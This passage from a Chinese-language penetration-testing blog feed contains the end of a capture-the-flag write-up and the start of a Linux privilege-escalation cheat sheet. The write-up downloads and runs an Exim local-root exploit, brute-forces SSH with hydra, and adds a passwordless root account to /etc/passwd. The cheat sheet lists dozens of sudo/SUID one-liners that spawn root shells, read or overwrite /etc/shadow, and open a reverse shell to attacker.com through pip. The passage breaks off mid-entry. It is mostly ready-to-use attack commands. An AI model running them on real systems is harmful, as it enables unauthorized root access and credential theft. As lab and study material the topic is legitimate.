alt="image-20240524112528101"></p><p>ok成功反弹shell</p><h1 id="4-提权"><a href="#4-提权" class="headerlink" title="4. 提权"></a>4. 提权</h1><h2 id="4-1-命令提权exim"><a href="#4-1-命令提权exim" class="headerlink" title="4.1 命令提权exim"></a>4.1 命令提权exim</h2><p>通过命令查询具有root权限可执行的二进制文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405250954007.png" alt="image-20240525095423911"></p><p>还是看到挺多有用的指令的，我们可以尝试一下，但是挺多都不太管用</p><blockquote><p>可以尝试的指令：passwd、exim4、mount、su</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405250956242.png" alt="image-20240525095608209"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405250956796.png" alt="image-20240525095630759"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405250956681.png" alt="image-20240525095659644"></p><p>最后还能够用来提权的就是难度系数比较大的<code>exim4</code>，先查看一下版本信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exim --version<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405250958079.png" alt="image-20240525095809035"></p><p>可以获得的信息如下：</p><blockquote><p>版本：4.89</p></blockquote><p>通过使用<code>searchsploit</code>查询得到确实有用于本地提权的方法</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405251000756.png" alt="image-20240525100018683"></p><blockquote><p>Exim 4.87 - 4.91 - Local Privilege Escalationlinux&#x2F;local&#x2F;46996.sh<br>Exim 4.87 &#x2F; 4.91 - Local Privilege Escalation (Metasploit)linux&#x2F;local&#x2F;47307.rb<br>Exim 4.87 &#x2F; 4.91 - Local Privilege Escalation (Metasploit)linux&#x2F;local&#x2F;47307.rb</p></blockquote><p>通过命令下载相应的提权脚本到当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -m 46996.sh<br></code></pre></td></tr></table></figure><p>然后将相应的脚本部署到服务器中，使用已经获得基础shell的目标主机通过<code>wget</code>命令下载该提权脚本进行执行，由于现在攻击机和目标机在同一网段，所以直接通过在攻击机部署apache2服务让目标机下载即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">service apache2 start<br><span class="hljs-built_in">cp</span> 46996.sh /var/www/html/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405251006068.png" alt="image-20240525100659009"></p><p>然后再到目标主机通过服务器的ip地址和文件位置下载相应的脚本文件即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://192.168.31.221/46996.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405251009891.png" alt="image-20240525100919848"></p><p>似乎由于权限不够，不能够再当前目录写入，一般情况下tmp目录都具有相当高的权限，可以尝试到&#x2F;tmp目录下进行脚本的下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br>wget http://192.168.31.221/46996.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405251013321.png" alt="image-20240525101311280"></p><p>成功下载，此时我们再为下载的脚本文件给上可执行权限，再执行即可提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x 46996.sh<br>./46996.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405251015935.png" alt="image-20240525101500890"></p><p>提权成功，寻找flag文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405251015927.png" alt="image-20240525101552881"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405251016519.png" alt="image-20240525101624477"></p><p>ok，该提权完毕，结束！</p><h2 id="4-2-寻找信息提权"><a href="#4-2-寻找信息提权" class="headerlink" title="4.2 寻找信息提权"></a>4.2 寻找信息提权</h2><p>一般在<code>/home</code>目录下能够找到其他用户的文件夹或者更多信息，也能够从各个文件夹中找到更多信息。本次是在<code>/home/jim</code>下找到了一个备份文件<code>backups</code>，里边有一个密码备份文件，似乎是一个密码字典，可以用来登录，尝试将相应的密码扒下来用<code>hydra</code>爆破ssh，密码文件内容如下：</p><blockquote><p>000000<br>12345<br>iloveyou<br>1q2w3e4r5t<br>1234<br>123456a<br>qwertyuiop<br>monkey<br>123321<br>dragon<br>654321<br>666666<br>123<br>myspace1<br>a123456<br>121212<br>1qaz2wsx<br>123qwe<br>123abc<br>tinkle<br>target123<br>gwerty<br>1g2w3e4r<br>gwerty123<br>zag12wsx<br>7777777<br>qwerty1<br>1q2w3e4r<br>987654321<br>222222<br>qwe123<br>qwerty123<br>zxcvbnm<br>555555<br>112233<br>fuckyou<br>asdfghjkl<br>12345a<br>123123123<br>1q2w3e<br>qazwsx<br>loveme1<br>juventus<br>jennifer1<br>!~!1<br>bubbles<br>samuel<br>fuckoff<br>lovers<br>cheese1<br>0123456<br>123asd<br>999999999<br>madison<br>elizabeth1<br>music<br>buster1<br>lauren<br>david1<br>tigger1<br>123qweasd<br>taylor1<br>carlos<br>tinkerbell<br>samantha1<br>Sojdlg123aljg<br>joshua1<br>poop<br>stella<br>myspace123<br>asdasd5<br>freedom1<br>whatever1<br>xxxxxx<br>00000<br>valentina<br>a1b2c3<br>741852963<br>austin<br>monica<br>qaz123<br>lovely1<br>music1<br>harley1<br>family1<br>spongebob1<br>steven<br>nirvana<br>1234abcd<br>hellokitty<br>thomas1<br>cooper<br>520520<br>muffin<br>christian1<br>love13<br>fucku2<br>arsenal1<br>lucky7<br>diablo<br>apples<br>george1<br>babyboy1<br>crystal<br>1122334455<br>player1<br>aa123456<br>vfhbyf<br>forever1<br>Password<br>winston<br>chivas1<br>sexy<br>hockey1<br>1a2b3c4d<br>pussy<br>playboy1<br>stalker<br>cherry<br>tweety<br>toyota<br>creative<br>gemini<br>pretty1<br>maverick<br>brittany1<br>nathan1<br>letmein1<br>cameron1<br>secret1<br>google1<br>heaven<br>martina<br>murphy<br>spongebob<br>uQA9Ebw445<br>fernando<br>pretty<br>startfinding<br>softball<br>dolphin1<br>fuckme<br>test123<br>qwerty1234<br>kobe24<br>alejandro<br>adrian<br>september<br>aaaaaa1<br>bubba1<br>isabella<br>abc123456<br>password3<br>jason1<br>abcdefg123<br>loveyou1<br>shannon<br>100200<br>manuel<br>leonardo<br>molly1<br>flowers<br>123456z<br>007007<br>password.<br>321321<br>miguel<br>samsung1<br>sergey<br>sweet1<br>abc1234<br>windows<br>qwert123<br>vfrcbv<br>poohbear<br>d123456<br>school1<br>badboy<br>951753<br>123456c<br>111<br>steven1<br>snoopy1<br>garfield<br>YAgjecc826<br>compaq<br>candy1<br>sarah1<br>qwerty123456<br>123456l<br>eminem1<br>141414<br>789789<br>maria<br>steelers<br>iloveme1<br>morgan1<br>winner<br>boomer<br>lolita<br>nastya<br>alexis1<br>carmen<br>angelo<br>nicholas1<br>portugal<br>precious<br>jackass1<br>jonathan1<br>yfnfif<br>bitch<br>tiffany<br>rabbit<br>rainbow1<br>angel123<br>popcorn<br>barbara<br>brandy<br>starwars1<br>barney<br>natalia<br>jibril04<br>hiphop<br>tiffany1<br>shorty<br>poohbear1<br>simone<br>albert<br>marlboro<br>hardcore<br>cowboys<br>sydney<br>alex<br>scorpio<br>1234512345<br>q12345<br>qq123456<br>onelove<br>bond007<br>abcdefg1<br>eagles<br>crystal1<br>azertyuiop<br>winter<br>sexy12<br>angelina<br>james<br>svetlana<br>fatima<br>123456k<br>icecream<br>popcorn1</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L username.txt -P passwordDict.txt ssh://192.168.31.224 -t 8<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405251315043.png" alt="image-20240525131507907"></p><blockquote><p>host: 192.168.31.224username: jimpassword: jibril04</p></blockquote><p>在这个账户里面尝试通过<code>sudo -l</code>和相应的命令尝试提权，但是并没有相应命令可以提权</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405251335277.png" alt="image-20240525133552222"></p><p>无法执行<code>sudo -l</code>命令</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405251337428.png" alt="image-20240525133702277"></p><p>然后再检索资料，最后再<code>/var/mail</code>发现了来自Charles的邮件，在其中发现了<code>charles</code>的密码<code>^xHhA&amp;hvim0y</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405251324876.png" alt="image-20240525132419706"></p><blockquote><p>username: charlespassword: ^xHhA&amp;hvim0y</p></blockquote><p>通过命令登录<code>charles</code>账户</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">su charles</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405251338590.png" alt="image-20240525133816529"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405251338557.png" alt="image-20240525133825512"></p><p>找到了<code>teehee</code>命令可以用来提权，尝试用来提权，进行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;shell::0:0:::/bin/bash&quot;</span> | sudo teehee -a /etc/passwd<br>su shell<br><span class="hljs-built_in">cat</span> /root/flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405251348935.png" alt="image-20240525134806882"></p><h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h1><ol><li>信息检索能力很重要，拿到主机shell的时候多去翻翻目录<code>var</code>、<code>home</code>等等目录，找找信息</li><li>exim4、teehee可以用于提权，多找命令</li><li>如何命令执行反弹shell</li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>打靶日记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux命令提权汇总</title>
    <link href="/2024/05/23/Linux%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83%E6%B1%87%E6%80%BB/"/>
    <url>/2024/05/23/Linux%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<p>参考内容：</p><p><a href="https://www.huangmj.com/17116743651246.html#3-sudo-apache2">Linux提权之Sudo 70种提权方法 - 简单安全 (huangmj.com)</a></p><p> <a href="https://gtfobins.github.io/">GTFOBins</a></p><h1 id="查询命令"><a href="#查询命令" class="headerlink" title="查询命令"></a>查询命令</h1><p>常见的可以利用sudo提权的命令</p><blockquote><p>nmap, vim, vi, nano, bash, less, more, cp, find, git, wget, cat, apt, zip, xxd, time, taskset, sed, pip, ed, tmux, scp, perl, awk, man, env, ftp, apache2, ash, base64, cpulimit, curl, date, dd, dstat, exiftool, fail2ban, flock, gcc, gdb, gzip, gunzip, hping3, iftop, java, jjs, journalctl, knife, mount, mysql, neofetch, nice, node, nohup, openvpn, passwd, php, pico, pkexec, python3, rvim, scp, screen, script, service, socat, ssh, ssh-keygen, strace, systemctl, tcpdump, tee, timedatectl, wall, watch, expect, exim4，teehee</p></blockquote><p>可以通过以下命令查询相应用户是否可执行上述命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">compgen -c | grep -E -x <span class="hljs-string">&quot;nmap|vim|vi|nano|bash|less|more|cp|find|git|wget|cat|apt|zip|xxd|time|taskset|sed|pip|ed|tmux|scp|perl|awk|man|env|ftp|apache2|ash|base64|cpulimit|curl|date|dd|dstat|exiftool|fail2ban|flock|gcc|gdb|gzip|gunzip|hping3|iftop|java|jjs|journalctl|knife|mount|mysql|neofetch|nice|node|nohup|openvpn|passwd|php|pico|pkexec|python3|rvim|scp|screen|script|service|socat|ssh|ssh-keygen|strace|systemctl|tcpdump|tee|timedatectl|wall|watch|expect|exim4|teehee&quot;</span><br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>sudo -l<br></code></pre></td></tr></table></figure><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><ul><li>旧版本通过进入交互提权</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --interactive<span class="hljs-comment">#启动交互模式</span><br>!sh<br></code></pre></td></tr></table></figure><ul><li>新版本通过在tmp目录写脚本执行提权</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span> &gt;/tmp/.123<br>sudo nmap --script=/tmp/.123<br></code></pre></td></tr></table></figure><h1 id="vim-or-vi"><a href="#vim-or-vi" class="headerlink" title="vim or vi"></a>vim or vi</h1><p>如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。</p><p>通过使用vim来打开任意一个文件，然后单击一次<code>Esc</code>进行命令模式，输入<code>:set shell=/bin/sh</code>，在输入<code>:shell</code>，即可提权</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">vim <span class="hljs-keyword">any</span>.txt<br><span class="hljs-comment">#Press Esc key</span><br>:<span class="hljs-built_in">set</span> <span class="hljs-built_in">shell</span>=/bin/sh<br>:<span class="hljs-built_in">shell</span><br></code></pre></td></tr></table></figure><h1 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h1><p>使用nano随便打开一个文件，通过<code>ctrl+x</code>执行命令，并输入<code>reset;bash 1&gt;&amp;0 2&gt;&amp;0</code>执行命令即可提权；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">nano any.txt<br>ctrl+x<br>reset;bash 1&gt;&amp;0 2&gt;&amp;0<br><span class="hljs-comment"># 回车</span><br></code></pre></td></tr></table></figure><h1 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h1><p>直接执行命令即可；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -p<br>sudo bash<br></code></pre></td></tr></table></figure><h1 id="less-or-more"><a href="#less-or-more" class="headerlink" title="less or more"></a>less or more</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">less /etc/passwd<br>more /etc/passed<br>!/bin/sh<br></code></pre></td></tr></table></figure><h1 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h1><p>通过使用kali生成明文密码的hash，通过使用下方命令加密一段明文</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkpasswd -m sha-512 admin<span class="hljs-comment"># $6$hUrZGcm9PHFWibnM$O4IX3xDqyfL1kp1MdUrbg3xgToPHpUR4cc8hqwRVB24zGwXCeuu8uGzDFYpQvwJ6BctAw0q468lbzr0hj5ndy1</span><br></code></pre></td></tr></table></figure><p>参考<code>/etc/shadow</code>文件中root用户的hash值保存起来到一个文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim root_shadow<br><span class="hljs-comment"># 输入root:$6$hUrZGcm9PHFWibnM$O4IX3xDqyfL1kp1MdUrbg3xgToPHpUR4cc8hqwRVB24zGwXCeuu8uGzDFYpQvwJ6BctAw0q468lbzr0hj5ndy1:19850:0:99999:7:::</span><br>Redshadow=/etc/shadow<br>TF=$(<span class="hljs-built_in">mktemp</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;root:$6$hUrZGcm9PHFWibnM$O4IX3xDqyfL1kp1MdUrbg3xgToPHpUR4cc8hqwRVB24zGwXCeuu8uGzDFYpQvwJ6BctAw0q468lbzr0hj5ndy1:19850:0:99999:7:::&#x27;</span> &gt; <span class="hljs-variable">$TF</span><br><span class="hljs-built_in">echo</span> &amp;TF<span class="hljs-comment">#/tmp/tmp.***</span><br><span class="hljs-built_in">cp</span> <span class="hljs-variable">$Redshadow</span> bark_shadow<span class="hljs-comment">#备份shadow文件</span><br><span class="hljs-built_in">cp</span> <span class="hljs-variable">$TF</span> <span class="hljs-variable">$Redshadow</span><br></code></pre></td></tr></table></figure><blockquote><p>注意：这个操作是有损的，最后靶机shadow文件中只有这一行，如果不进行备份，在实际攻防中优先级是排后的</p></blockquote><p>最后通过修改的root密码通过<code>su</code>命令登录root用户即可</p><h1 id="find"><a href="#find" class="headerlink" title="find"></a>find</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -<span class="hljs-built_in">exec</span> /bin/bash \; -quit<br></code></pre></td></tr></table></figure><h1 id="git"><a href="#git" class="headerlink" title="git"></a>git</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git branch --<span class="hljs-built_in">help</span><br>!/bin/bash<br></code></pre></td></tr></table></figure><h1 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">RedShell=$(<span class="hljs-built_in">mktemp</span>)<br><span class="hljs-built_in">chmod</span> +x <span class="hljs-variable">$RedShell</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;#!/bin/bash\n/bin/bash 1&gt;&amp;0&#x27;</span> &gt; <span class="hljs-variable">$RedShell</span><br>wget --use-askpass=<span class="hljs-variable">$RedShell</span> 0<br></code></pre></td></tr></table></figure><h1 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">RedShell=/etc/shadow<br><span class="hljs-built_in">cat</span> <span class="hljs-string">&quot;<span class="hljs-variable">$RedShell</span>&quot;</span><br></code></pre></td></tr></table></figure><p>可以查看到shadow中root用户加密后的密码，可以通过hashcat进行破解，需要直接加密方法；</p><h1 id="apt"><a href="#apt" class="headerlink" title="apt"></a>apt</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt update -o APT::Update::Pre-Invoke::=/bin/bash<br></code></pre></td></tr></table></figure><h1 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> 1.txt<br>zip 1.zip 1.txt -T --unzip-command=<span class="hljs-string">&quot;sh -c /bin/bash&quot;</span><br></code></pre></td></tr></table></figure><h1 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">xxd /etc/shadow | xxd -r<span class="hljs-comment">#获得加密后的root密码值，通过爆破获取密码</span><br>john root_pw.hash --wordlist=/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><h1 id="time"><a href="#time" class="headerlink" title="time"></a>time</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">time /bin/bash -p<br></code></pre></td></tr></table></figure><h1 id="taskset"><a href="#taskset" class="headerlink" title="taskset"></a>taskset</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">taskset 1 /bin/bash -p<br></code></pre></td></tr></table></figure><h1 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sed -n <span class="hljs-string">&#x27;1e exec bash 1&gt;&amp;0&#x27;</span> /etc/hosts<br></code></pre></td></tr></table></figure><h1 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h1><p>参考链接：<a href="https://gtfobins.github.io/gtfobins/pip/">果仁 | go away垃圾箱 (gtfobins.github.io)</a></p><ol><li>提权</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span> -d)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py<br>pip install <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure><ol start="2"><li>反弹shell</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> RHOST=attacker.com<br><span class="hljs-built_in">export</span> RPORT=12345<br>TF=$(<span class="hljs-built_in">mktemp</span> -d)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;import sys,socket,os,pty;s=socket.socket()</span><br><span class="hljs-string">s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))))</span><br><span class="hljs-string">[os.dup2(s.fileno(),fd) for fd in (0,1,2)]</span><br><span class="hljs-string">pty.spawn(&quot;/bin/sh&quot;)&#x27;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py<br>pip install <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure><h1 id="ed"><a href="#ed" class="headerlink" title="ed"></a>ed</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ed<br>!/bin/bash<br></code></pre></td></tr></table></figure><h1 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tmux<br></code></pre></td></tr></table></figure><p>直接执行即可，因为它本身就是通过启动新的shell实现端口复用的</p><h1 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">RedShell=$(mktemep)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;bash 0&lt;&amp;2 1&lt;&amp;2&#x27;</span> &gt; <span class="hljs-variable">$RedShell</span><br><span class="hljs-built_in">chmod</span> +x <span class="hljs-string">&quot;<span class="hljs-variable">$RedShell</span>&quot;</span><br>scp -S &amp;RedShell x y;<br></code></pre></td></tr></table></figure><h1 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -e <span class="hljs-string">&#x27;exec &quot;/bin/bash&quot;;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="man"><a href="#man" class="headerlink" title="man"></a>man</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">man <span class="hljs-built_in">ls</span><br>!/bin/bash<br></code></pre></td></tr></table></figure><h1 id="env"><a href="#env" class="headerlink" title="env"></a>env</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">env</span> /bin/bash<br></code></pre></td></tr></table></figure><h1 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp<br>!/bin/bash<br></code></pre></td></tr></table></figure><h1 id="apache2"><a href="#apache2" class="headerlink" title="apache2"></a>apache2</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apache2 -f /etc/shadow<br></code></pre></td></tr></table></figure><p>通过报错获取root用户的加密密码，在通过john破解获得root的密码进行登录</p><h1 id="ash"><a href="#ash" class="headerlink" title="ash"></a>ash</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ash<br><span class="hljs-built_in">whoami</span><br>bash<br></code></pre></td></tr></table></figure><h1 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">RedShell=/etc/shadow<br><span class="hljs-built_in">base64</span> <span class="hljs-string">&quot;<span class="hljs-variable">$RedShell</span>&quot;</span> | <span class="hljs-built_in">base64</span> -d<br></code></pre></td></tr></table></figure><h1 id="cpulimit"><a href="#cpulimit" class="headerlink" title="cpulimit"></a>cpulimit</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cpulimit -l 100 -f /bin/bash<br></code></pre></td></tr></table></figure><h1 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h1><p>通过使用kali生成明文密码的hash，通过使用下方命令加密一段明文</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkpasswd -m sha-512 admin<span class="hljs-comment"># $6$hUrZGcm9PHFWibnM$O4IX3xDqyfL1kp1MdUrbg3xgToPHpUR4cc8hqwRVB24zGwXCeuu8uGzDFYpQvwJ6BctAw0q468lbzr0hj5ndy1</span><br></code></pre></td></tr></table></figure><p>参考<code>/etc/shadow</code>文件中root用户的hash值保存起来到一个文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim root_shadow<br><span class="hljs-comment"># 